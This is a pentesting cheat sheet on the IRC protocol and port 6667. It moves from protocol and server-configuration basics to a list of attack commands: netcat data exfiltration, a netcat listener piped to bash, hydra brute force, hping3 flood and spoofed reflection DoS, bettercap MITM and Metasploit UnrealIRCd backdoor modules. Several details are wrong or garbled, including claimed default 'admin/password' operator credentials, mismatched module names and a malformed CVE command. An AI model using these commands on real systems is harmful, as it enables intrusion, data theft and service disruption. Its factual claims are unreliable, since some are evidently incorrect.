# Index
- [[Ports, Protocols, and Services]]
	- [[P6697 IRCS]]

# Internet Relay Chat (IRC) Protocol

- **Port Number:** 6667 (default), 194, 7000 (often used for SSL)
- **Protocol:** TCP
- **Service Name:** Internet Relay Chat (IRC)
- **Defined in:** RFC 1459, RFC 2810, RFC 2811, RFC 2812, RFC 2813

Internet Relay Chat (IRC) is an application-layer protocol that facilitates communication in the form of text. It is designed for group communication in discussion forums, called channels, but also allows for one-on-one communication via private messages as well as data transfers through Direct Client-to-Client (DCC) and chat bot functionality.

## Overview of Features

- **Channel-Based Communication:** IRC operates through channels, which are chat rooms identified by a hashtag (e.g., `#channelname`). Multiple users can join these channels to participate in group discussions.

- **Private Messaging:** Users can send private messages directly to other users, allowing for one-on-one communication.

- **User and Channel Modes:** IRC supports various user modes (e.g., operator, voice) and channel modes (e.g., invite-only, moderated) that control user permissions and channel behavior.

- **Nickname Registration:** Users can register and protect their nicknames, ensuring that they can maintain their identity across sessions.

- **Direct Client-to-Client (DCC):** IRC supports DCC, which allows users to directly connect to each other for private chats and file transfers, bypassing the IRC server.

- **Bot Support:** IRC is well-known for its bot support, which can automate tasks, provide information, or even moderate channels.

## Typical Use Cases

- **Real-Time Communication:** IRC is primarily used for real-time communication in both public and private channels. It was one of the earliest forms of online group chat.

- **Community Building:** Many open-source communities, gaming groups, and other online communities use IRC for organizing discussions, support channels, and collaborative work.

- **File Sharing:** DCC allows users to share files directly, which has historically been used for both legitimate file transfers and more nefarious activities like distributing pirated content.

- **Bot Automation:** IRC bots can manage channels, relay messages, or even provide external data feeds, making them useful in various automation tasks.

## How IRC Protocol Works

1. **Connection Establishment:**
   - **Step 1:** The client initiates a TCP connection to the IRC server on port 6667 (or another port, such as 194 or 7000 for SSL).
   - **Step 2:** Upon establishing the connection, the client sends a `NICK` command to register a nickname and a `USER` command to provide user details (username, hostname, servername, and real name).

2. **Server Response:**
   - **Step 3:** The server checks the provided nickname and user details. If the nickname is available, the server responds with a welcome message and additional information about the server and its capabilities.
   - **Step 4:** If the nickname is already in use, the server responds with an error, prompting the client to choose another nickname.

3. **Joining Channels:**
   - **Step 5:** The client sends a `JOIN` command to enter a specific channel (e.g., `JOIN #channelname`).
   - **Step 6:** The server responds with a list of users currently in the channel and any relevant channel modes (e.g., `+o` for operators).
   - **Step 7:** The client can now send and receive messages within the channel using the `PRIVMSG` command.

4. **Sending and Receiving Messages:**
   - **Step 8:** To send a message to a channel, the client uses the `PRIVMSG` command followed by the channel name and the message (e.g., `PRIVMSG #channelname :Hello everyone`).
   - **Step 9:** To send a private message to another user, the client uses the `PRIVMSG` command followed by the nickname and the message (e.g., `PRIVMSG nickname :Hello there`).

5. **Managing Nicknames and Modes:**
   - **Step 10:** The client can change their nickname using the `NICK` command (e.g., `NICK newnickname`).
   - **Step 11:** Users with sufficient privileges can manage channel modes using the `MODE` command (e.g., `MODE #channelname +m` to set the channel to moderated mode).

6. **Direct Client-to-Client (DCC) Communication:**
   - **Step 12:** For direct communication or file transfer, the client initiates a DCC session by sending a `DCC SEND` or `DCC CHAT` command.
   - **Step 13:** The recipient receives an invitation to establish a direct connection, bypassing the IRC server.

7. **Connection Termination:**
   - **Step 14:** The client can leave a channel using the `PART` command or disconnect from the server using the `QUIT` command.
   - **Step 15:** The server acknowledges the disconnection and closes the connection.

### Diagram (Hypothetical Example)
- **Client:** `<attack_ip>` connects to `irc.example.com` on port 6667.
- **Server:** Assigns `<attack_ip>` the nickname "user123" and allows them to join `#examplechannel`.
- **Client:** Sends a message "Hello" to `#examplechannel` using `PRIVMSG`.

# Additional Information

## Security Considerations
- **Lack of Encryption:** By default, IRC communication is unencrypted, making it vulnerable to eavesdropping. SSL/TLS can be implemented to secure the connection, typically on ports like 6697 or 7000.
  
- **Nickname Spoofing:** Since nicknames can be changed easily, attackers can impersonate other users unless nickname registration and protection services are enabled.

- **DDoS Vulnerabilities:** IRC networks have historically been targets for DDoS attacks, particularly due to their reliance on centralized servers.

- **Botnets:** IRC has been used by attackers to control botnets, leveraging its simple text-based protocol for command and control (C2) communication.

## Alternatives
- **Slack/Discord:** Modern alternatives like Slack and Discord offer similar real-time communication features but with more integrated services and stronger security measures.
  
- **Matrix:** An open standard protocol for secure, decentralized communication that offers similar features to IRC but with modern security practices.

## Advanced Usage
- **IRC Bouncers (BNC):** A bouncer is a type of proxy server that maintains a persistent connection to an IRC server, allowing the client to disconnect and reconnect without losing messages.
  
- **Channel Services:** Many IRC networks offer services such as ChanServ (for channel management) and NickServ (for nickname registration), which enhance the security and usability of the IRC network.

## Modes of Operation
- **Public Channels:** Open to all users, public channels are the most common type of IRC channel, typically used for general discussions.
  
- **Private Channels:** Invite-only channels that require an invitation or a password to join, providing a layer of privacy.

- **Secret Channels:** Similar to private channels but do not appear in channel listings, making them more difficult to discover.

## Configuration Files

1. **IRC Server Configuration:**
- **Typical Configuration File Locations:**
  - **UnrealIRCd:** `/etc/unrealircd/unrealircd.conf`
  - **InspIRCd:** `/etc/inspircd/inspircd.conf`
  - **ircd-hybrid:** `/etc/ircd-hybrid/ircd.conf`

2. **Example Configuration (UnrealIRCd):**
```bash
# Server configuration block
listen *:6667;
listen *:7000 ssl;

# Define server info
me {
    name "irc.example.com";
    info "Example IRC Server";
    numeric 001;
};

# Link block for server linking
link hub.example.com {
    username *;
    hostname hub.example.com;
    bind-ip *;
    port 7029;
    password-connect "secret";
    password-receive "secret";
};

# Operators block
operator "admin" {
    user = "admin";
    host = "*@example.com";
    password "supersecretpassword";
    flags "o";
};

# Channel settings
allow channel {
    channel "#examplechannel";
    mode "+nt";
};
```

### Configuration Settings (Table)
|**Setting**|**Description**|
|-|-|
| `listen`           | Specifies the IP address and port for the server to listen on.                  |
| `me`               | Configures the server's identity and network presence.                          |
| `link`             | Used to define links between servers in an IRC network.                         |
| `operator`         | Defines IRC operators who have administrative control over the server.          |
| `allow channel`    | Specifies allowed channels and their default modes.                             |
| `mode`             | Sets default channel modes, e.g., `+nt` (no external messages, topic protected).|

## Potential Misconfigurations

1. **Unencrypted Communication:**
   - **Risk:** IRC servers running on default ports (6667) without SSL/TLS are vulnerable to eavesdropping and MITM attacks.
   - **Exploitation:** Attackers can intercept and manipulate IRC traffic, potentially stealing credentials or injecting malicious commands.
   - **Mitigation:** Always configure SSL/TLS on ports like 6697 or 7000 to secure communications.

2. **Weak Operator Passwords:**
   - **Risk:** Weak passwords for IRC operators (`opers`) can be brute-forced, giving attackers control over the server.
   - **Exploitation:** If an attacker gains operator status, they can take over channels, kick/ban users, or disrupt the server.
   - **Mitigation:** Use strong, complex passwords for operator accounts and consider implementing additional security measures like IP-based restrictions.

3. **Misconfigured Channel Modes:**
   - **Risk:** Improperly configured channel modes can expose channels to spam, takeover, or unauthorized access.
   - **Exploitation:** Attackers can flood channels with spam or exploit open channels to distribute malware or phishing links.
   - **Mitigation:** Carefully configure channel modes to control who can join, send messages, and manage the channel.

4. **Open Proxy Abuse:**
   - **Risk:** Servers that allow unrestricted use of proxies can be abused by attackers to anonymize their activities.
   - **Exploitation:** Attackers can connect through proxies to evade bans, participate in illegal activities, or control botnets.
   - **Mitigation:** Implement proxy detection and filtering to prevent abuse.

## Default Credentials

While IRC itself does not have "default credentials," many IRC servers and services have default configurations that could be exploited if not properly secured.

- **UnrealIRCd:**
  - Default Operator Username: `admin`
  - Default Operator Password: `password`

- **InspIRCd:**
  - Default Operator Username: `admin`
  - Default Operator Password: `password`

# Interaction and Tools

## [[IRC]]
- **Connect to IRC Server:** Connects to an IRC server at the specified address and port.
	```bash
	/connect <target_ip> <target_port>
	```
- **Connecting to an IRCS Server:** Connects to the IRCS server on port 6697 with SSL/TLS encryption.
	```bash
	/server -ssl <target_ip> 6697
	```
- **Set User Information:** Sends user information to the server after connecting.
	```bash
	USER <username> <hostname> <servername> <realname>
	```
- **Disconnect From Server with Optional Message:** Disconnects from the IRC server with an optional message.
	```bash
	/quit <message>
	```
- **List Channels:** Lists all available channels on the server.
	```bash
	/list
	```
- **Join Channel:** Joins a specified IRC channel.
	```bash
	/join #<channel_name>
	```
- **Leave Channel:**
	```bash
	/part #<channel_name>
	```
- **Change User Nickname:** Registers or changes the client’s nickname.
	```bash
	/nick <nickname>
	```
- **Send Message to Channel:** Sends a message to all users in the specified channel.
	```bash
	/msg #channelname :message
	```
- **Send Private Message:**
	```bash
	/msg <nickname> <message>
	```
- **Set or Display Channel Mode:** Sets a channel to moderated mode, where only users with voice or operator status can speak.
	```bash
	/mode <channel> <modes>
	```
- **Setting User Modes:** Hides the user's IP address from other users (depending on server settings).
	```bash
	/mode <nickname> +x
	```
- **Grant Operator Status to User in Channel**
	```bash
	/op <nickname>
	```
- **Kicks User From Channel:**
	```bash
	/kick <nickname> <optional_message>
	```
- **Ban User from Channel:**
	```bash
	/ban <nickname>
	```

## Tools

### [[Telnet]]
- **Connect to IRC Server:**
	```bash
	telnet <target_ip> 6667
	NICK <nickname>
	USER <username> <hostname> <servername> :<realname>
	JOIN #<channel_name>
	PRIVMSG #<channel_name> :<message>
	```

### [[IRSSI]]
- **Connect to IRC Server:**
	```bash
	irssi -c <target_ip> -p 6667 -n <nickname>
	```

### [[WeeChat]]
- **Connect to an IRC Server:**
	```bash
	/server add <server_name> <server_address> <port> /connect <server_name>
	```

### [[HexChat]]
- **Connect to an IRC Server:**
	```bash
	/server -ssl <target_ip> 6697
	```

## Exploitation Tools

### [[Metasploit]]

### [[Wireshark]]
- **Wireshark Packet Capture:**
	```bash
	wireshark -i <interface> -f "tcp port 6667"
	```

### [[Nmap]]
- **Basic Nmap Scan:** Scan target on specified port to verify if service is on.
    ```bash
    nmap <target_ip> -p 6667
    ```

### [[NetCat]]
- **Netcat TCP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 6667
    ```
- **Netcat UDP Connect:** Simple test to verify port service is running and responding.
    ```bash
    nc <target_ip> 6667 -u
    ```
- **Execute Commands:** Execute commands on target.
	```bash
	echo "<command>" | nc <target_ip> 6667
	```
- **Exfiltrate Data:** Exfiltrate data over specified port.
	```bash
	nc <target_ip> 6667 < secret_data.txt
	```

### [[SoCat Cheat Sheet]]
- **SoCat TCP Connect:** Simple tests to verify port service is running and responding.
	```bash
	socat - TCP:<target_ip>:6667
	```

### [[HPing3 Cheat Sheet]]
- **Send Packet:** Send TCP packet to the service. Use `-2` to send UDP packet.
    ```bash
    hping3 <target_ip> -p 6667
    ```

# Penetration Testing Techniques

## External Reconnaissance

### Port Scanning
- **Tool:** [[Nmap]]
    ```bash
    nmap <target_ip> -p 6667
    ```
- **Description:** Identifies if the target service is running on the target by scanning target port.

### Service Enumeration
- **Tool:** [[NetCat]]
    ```bash
    nc <target_ip> 6667
    ```
- **Description:** Retrieves the service banner to identify the software version and potential vulnerabilities.

## Initial Access

### Exploiting Unsecured IRC Servers:**
- **Tool:** [[Metasploit]]
    ```bash
    use auxiliary/scanner/irc/irc_login
    set RHOSTS <target_ip>
    run
    ```
- **Description:** Exploits known vulnerabilities in IRC servers to gain unauthorized access.

## Credential Harvesting

### Packet Capture
- **Tool:** [[Wireshark]]
    ```bash
    wireshark -i <interface> -f "tcp port <port>"
    ```
- **Description:** Capture traffic and extract plaintext credentials.

### Man-in-the-Middle (MITM) Attack
- **Tool:** [[BetterCap Cheat Sheet]]
	```bash
	bettercap -iface <interface> -T <target_ip> --proxy
	```
- **Description:** Intercept and analyze traffic between the client and server, potentially capturing credentials by performing an ARP spoofing attack.

## Privilege Escalation

### Operator Privilege Escalation
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/multi/irc/unreal_ircd_3281_backdoor
    set RHOST <target_ip>
    run
    ```
- **Description:** Exploits known IRC vulnerabilities to escalate privileges to an IRC operator.

## Lateral Movement, Pivoting, and Tunneling

### Tunneling IRC Over SSH
- **Tool:** [[SSH]]
	```bash
	ssh -L 6667:<server_ip>:6667 <user>@<ssh_server>
	```
- **Description:** Secure IRC communication by tunneling it over SSH.

### Using IRC as a Command and Control (C2) Channel
- **Tool:** [[IRC]]
    ```bash
    nc -l -p 6667 | bash
    ```
- **Description:** Sets up an IRC bot or script to relay commands across the network, enabling lateral movement.

## Defense Evasion

### Cloaking Using Proxies
- **Tool:** [[Proxychains]]
    ```bash
    proxychains irssi -c irc.example.com -p 6667
    ```
- **Description:** Connects to IRC through multiple proxies to hide the attacker’s origin.

# Exploits and Attacks

## Password Attacks

### Password Brute Force
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra irc://<target_ip> -s 6667 -l <username> -P <password_list>
    ```
- **Description:** Test a single username against multiple passwords.

### Password Spray
- **Tool:** [[Hydra Cheat Sheet]]
    ```bash
    hydra irc://<target_ip> -s 6667 -l <username_list> -P <password>
    ```
- **Description:** Test a multiple usernames against a single password.

## Denial of Service

### Techniques:

### TCP/UPD Flood Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip> -p 6667 --flood --rand-source -c 1000
    ```
- **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

### TCP/UDP Reflection Attack
- **Tool:** [[HPing3 Cheat Sheet]]
    ```bash
    hping3 <target_ip_1> -p 6667 --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
- **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

### Channel Flooding
- **Tool:** [[IRC]]
    ```bash
    while true; do /msg #channelname :message; done
    ```
- **Description:** Floods a channel with messages, disrupting legitimate communication.

## Exploits 

### UnrealIRCd Backdoor
- **Tool:** [[Metasploit]]
    ```bash
    use exploit/unix/irc/unreal_ircd_3281_backdoor
    set RHOST <target_ip>
    set RPORT 6667
    run
    ```
- **Description:** Exploits a backdoor in UnrealIRCd 3.2.8.1 to gain remote code execution.

### DCC Exploitation
- **Tool:** [[Metasploit]]
    ```bash
    use auxiliary/scanner/irc/irc_version
    set RHOSTS <target_ip>
    run
    ```
- **Description:** Exploits vulnerabilities in DCC to gain unauthorized access to client systems.

### CVE-1999-0382
- **Tool:** [[NetCat]]
	```bash
	nc <target_ip> 6667 /SEND AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	```
- **Description:** Remote attacker could cause a Denial of Service (DoS) by sending malformed IRC commands.

# Resources

|**Website**|**URL**|
|-|-|
|RFC 1459 (IRC Protocol)|https://tools.ietf.org/html/rfc1459|
|UnrealIRCd Documentation|https://www.unrealircd.org/docs/|
|HexChat|https://hexchat.github.io/|
|WeeChat|https://weechat.org/|
|IRSSI|https://irssi.org/|
|THC Hydra|https://github.com/vanhauser-thc/thc-hydra|
|Metasploit Framework|https://www.metasploit.com/|
|InspIRCd Documentation|https://docs.inspircd.org/|
|IRC Bouncers (ZNC)|https://znc.in/|
|Wireshark User Guide|https://www.wireshark.org/docs/wsug_html_chunked/|